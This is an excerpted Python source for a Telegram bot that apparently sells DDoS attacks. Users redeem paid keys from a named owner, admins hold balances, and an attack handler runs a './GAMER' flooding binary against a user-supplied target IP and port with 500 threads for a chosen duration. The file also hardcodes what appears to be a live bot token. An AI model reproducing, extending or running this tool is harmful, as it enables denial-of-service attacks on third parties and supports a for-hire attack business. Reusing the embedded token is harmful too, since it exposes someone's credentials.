...
ADMIN_IDS = [5898718899]
BOT_TOKEN = "7588159887:AAFrDDQk5H2hkXyGmrZxIVWp3LV7rILfrQQ"
thread_count = 500
packet_size = 12
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    ...
    try:
        ...
        if attack_in_progress:
            bot.send_message(chat_id, "🚨 An attack is already in progress. Please wait for it to finish.")
            return

        # Set attack_in_progress to True
        ...
        command = f"./GAMER {target_ip} {target_port} {duration} {packet_size} {thread_count}"
        ...
        # Set attack_in_progress to False when the attack finishes
...
def send_owner_info(message):
    ...
    owner_message = "This Bot Has Been Developed By ᚛ @Pk_Chopra ᚜"  
...
def send_welcome(message):
    ...
    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By ᚛ @Pk_Chopra ᚜\n\n"
            f"Admin Commands:\n"
        ...
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By ᚛ @Pk_Chopra ᚜\n\n"
...
def attack_button_handler(message):
    ...
    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Pk_Chopra ᚜*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Pk_Chopra ᚜.*", parse_mode='Markdown')
        return
    ...
    if is_super_admin(user_id):
        ...
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
                ...
                "Contact ᚛ @Pk_Chopra ᚜ for assistance."
            )
        else:
            account_info = (
        ...
        account_info = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @Pk_Chopra ᚜."
